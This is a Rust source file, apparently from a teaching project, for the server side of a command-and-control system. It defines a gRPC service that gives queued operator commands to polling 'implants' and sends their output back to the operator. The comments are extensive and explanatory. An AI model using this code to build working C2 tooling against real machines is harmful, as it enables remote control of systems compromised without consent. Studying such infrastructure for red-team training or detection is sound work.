// ImplantService - Server-side handler for implant connections
//
// ARCHITECTURE OVERVIEW:
// This service is part of a Command & Control (C2) system for educational purposes.
// It handles communication with "implants" (remote agents) that poll for commands.
//
// CHANNEL FLOW:
// Admin -> work_tx -> work_rx -> Implant (this service receives from work_rx)
// Implant -> output_tx -> output_rx -> Admin (this service sends to output_tx)
//
// The implant service acts as a bridge between the work queue (commands from admin)
// and the output queue (results from implants back to admin).

use crate::proto::implant_server::Implant;
use crate::proto::{Command, Empty};
use std::sync::Arc;
use tokio::sync::{mpsc, Mutex};
use tonic::{Request, Response, Status};

/// ImplantService handles gRPC requests from implant clients
///
/// FIELDS:
/// - work_rx: Receives commands from the admin (via work channel)
///   - Wrapped in Arc<Mutex<>> because multiple gRPC requests may arrive concurrently
///   - Each request needs to lock the receiver to try to get a command
///   - UnboundedReceiver means there's no limit on queued commands
///
/// - output_tx: Sends command results back to admin (via output channel)
///   - Clone-able sender, so we don't need Arc<Mutex<>>
///   - Multiple implants can send results concurrently
#[derive(Debug, Clone)]
pub struct ImplantService {
    pub work_rx: Arc<Mutex<mpsc::UnboundedReceiver<Command>>>,
    pub output_tx: mpsc::UnboundedSender<Command>,
}

// Implement the Implant trait (generated from proto/implant.proto)
// This trait defines the RPC methods that implants can call
#[tonic::async_trait]
impl Implant for ImplantService {
    /// FetchCommand is called by the implant to get work
    ///
    /// FLOW:
    /// 1. Implant polls this every 3 seconds (see bin/implant.rs)
    /// 2. We check the work_rx channel for commands
    /// 3. If a command exists, return it
    /// 4. If no command, return empty Command (tells implant to keep waiting)
    ///
    /// WHY NON-BLOCKING (try_recv)?
    /// - We don't want to block the gRPC thread waiting for commands
    /// - If we used blocking recv(), the implant's HTTP request would hang
    /// - Non-blocking lets us immediately respond "no work available"
    async fn fetch_command(&self, _request: Request<Empty>) -> Result<Response<Command>, Status> {
        // Lock the receiver to check for commands
        // The lock is held only during try_recv, then automatically released
        let mut rx = self.work_rx.lock().await;

        // Try to receive a command without blocking
        match rx.try_recv() {
            // Command available! Return it to the implant
            Ok(cmd) => Ok(Response::new(cmd)),

            // No commands in the queue
            Err(mpsc::error::TryRecvError::Empty) => {
                // Return empty command to signal "no work available"
                // The implant will sleep and poll again later
                Ok(Response::new(Command {
                    inp: String::new(),
                    out: String::new(),
                }))
            }

            // Channel was closed (shouldn't happen in normal operation)
            Err(mpsc::error::TryRecvError::Disconnected) => {
                Err(Status::internal("Work channel closed"))
            }
        }
    }

    /// SendOutput is called by the implant to return command results
    ///
    /// FLOW:
    /// 1. Implant executes a command it received
    /// 2. Implant calls this RPC with the command + output
    /// 3. We send it to output_tx channel
    /// 4. Admin is waiting on output_rx and receives it
    ///
    /// WHY UNBOUNDED CHANNEL?
    /// - Multiple implants might send results simultaneously
    /// - We don't want to block implants if admin is slow to read
    /// - In production, you'd want bounded channels to prevent memory issues
    async fn send_output(&self, request: Request<Command>) -> Result<Response<Empty>, Status> {
        let cmd = request.into_inner();

        // Send the result to the output channel
        // This is non-blocking because UnboundedSender never blocks
        self.output_tx
            .send(cmd)
            .map_err(|_| Status::internal("Failed to send output"))?;

        // Return empty response to acknowledge receipt
        Ok(Response::new(Empty {}))
    }
}